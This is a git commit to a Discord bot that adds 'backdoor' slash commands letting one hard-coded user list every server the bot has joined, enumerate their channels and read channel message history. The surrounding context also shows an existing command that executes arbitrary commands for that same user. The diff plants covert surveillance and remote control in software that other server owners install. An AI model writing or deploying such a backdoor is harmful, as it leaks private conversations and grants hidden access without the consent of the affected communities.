726ee725e8a3807f9467d2407c25fa4b1b5a3095
zaddmc <davidbk927@gmail.com>
2025-11-18 18:05:39 +0100

    leaking history is now possible

--- cogs/backdoor.py
+++ cogs/backdoor.py
@@ -10,6 +10,62 @@ class Backdoor(commands.Cog):
     def __init__(self, bot):
         self.bot: discord.Bot = bot
 
+    @ac.command(name="backdoor_leak_servers", description="Leak all available servers")
+    async def leak_servers(self, intr: discord.Interaction):
+        respond = intr.response.send_message
+        if intr.user not in utils.authorized_users:
+            await utils.log_channel.send(f"User {intr.user.name} tried to leak servers")
+            await respond("You are not permitted to use this command", ephemeral=True)
+            return
+
+        string = "Connected Servers are:\n" + "\n".join(
+            map(lambda g: f"{g}: {g.id}", self.bot.guilds)
+        )
+        await respond(string, ephemeral=True)
+
+    @ac.command(name="backdoor_leak_channels", description="Leak a channels of server")
+    async def leak_channels(self, intr: discord.Interaction, channel_id: str):
+        respond = intr.response.send_message
+        if intr.user not in utils.authorized_users:
+            await utils.log_channel.send(f"User {intr.user.name} tried to leak cahnnel")
+            await respond("You are not permitted to use this command", ephemeral=True)
+            return
+        if not channel_id.isdigit():
+            await respond("Invalid Channel", ephemeral=True)
+            return
+
+        guild = await self.bot.fetch_guild(channel_id)
+        channels = await guild.fetch_channels()
+        string = "Available channels are:\n" + "\n".join(
+            map(lambda s: f"{s.name}: {s.id}", channels)
+        )
+        await respond(string, ephemeral=True)
+
+    @ac.command(
+        name="backdor_leak_channel_history", description="Reveal history of channel"
+    )
+    async def leak_channel_history(self, intr: discord.Interaction, channel_id: str):
+        respond = intr.response.send_message
+        if intr.user not in utils.authorized_users:
+            await utils.log_channel.send(f"User {intr.user.name} tried to leak cahnnel")
+            await respond("You are not permitted to use this command", ephemeral=True)
+            return
+        if not channel_id.isdigit():
+            await respond("Invalid Channel", ephemeral=True)
+            return
+
+        channel_obj = await self.bot.fetch_channel(channel_id)
+        messages: discord.Message = [
+            m.content
+            async for m in channel_obj.history(limit=10, oldest_first=True)
+            if len(m.content) != 0
+        ]
+        if len(messages) == 0:
+            await respond("Nothing to leak (might be pictures)", ephemeral=True)
+            return
+        string = "The messages are:\n" + "\n".join(messages)
+        await respond(string, ephemeral=True)
+
     @ac.command(name="execute", description="Execute some command")
     async def execute_any(self, interaction: discord.Interaction, cmd: str):
         if interaction.user.name != "zaddmc":
--- utils.py
+++ utils.py
@@ -2,10 +2,14 @@ import discord
 
 
 async def init(ebot: discord.ext.commands.Bot):
-    global bot, test_server, log_channel
+    global bot, test_server, log_channel, authorized_users
     bot = ebot
     test_server = await bot.fetch_guild(593152900063297557)  # Server-usage
     log_channel = await bot.fetch_channel(1425561165802770492)  # Server-usage  bot-logs
+    authorized_users = []
+    for uid in [433667370100195328]:  # Me
+        user = await bot.fetch_user(uid)
+        authorized_users.append(user)
 
 
 def get_guilds() -> list[discord.Guild]:
